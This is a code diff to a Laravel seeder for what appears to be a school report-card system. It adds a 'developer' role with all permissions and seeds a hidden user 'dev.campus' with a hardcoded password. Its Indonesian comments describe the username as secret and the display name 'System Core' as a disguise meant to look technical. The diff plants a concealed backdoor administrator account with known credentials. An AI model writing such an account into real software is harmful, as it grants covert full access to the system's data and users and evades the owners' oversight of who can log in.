@@ -64,6 +64,9 @@ class RolePermissionSeeder extends Seeder
         // 4. BUAT ROLE SPESIAL
         // ====================================================
         
+        $roleDev = Role::create(['name' => 'developer']);
+        $roleDev->givePermissionTo(Permission::all());
+        
         // --- ROLE 1: ADMIN ERAPOR (FULL AKSES) ---
         $roleAdmin = Role::create(['name' => 'admin_erapor']);
         $roleAdmin->givePermissionTo(Permission::all()); // Sakti mandraguna
@@ -98,6 +101,20 @@ class RolePermissionSeeder extends Seeder
         // ====================================================
         // 5. BUAT USER SPESIAL OTOMATIS
         // ====================================================
+        
+        // USER 0: DEVELOPER (AKUN DARURAT)
+        $dev = User::firstOrCreate(
+            ['username' => 'dev.campus'], // Username rahasia
+            [
+                'name'      => 'System Core', // Nama samaran agar terlihat teknis
+                'email'     => 'campus@dev.id',
+                'password'  => Hash::make('campussolusi26#'), // Password Kuat
+                'role'      => 'developer',
+            ]
+        );
+        $dev->assignRole($roleDev);
+        
+        $this->command->info('Akun Developer Hidden berhasil dibuat!');
         
         // USER 1: ADMIN ERAPOR
         $adminUser = User::firstOrCreate(
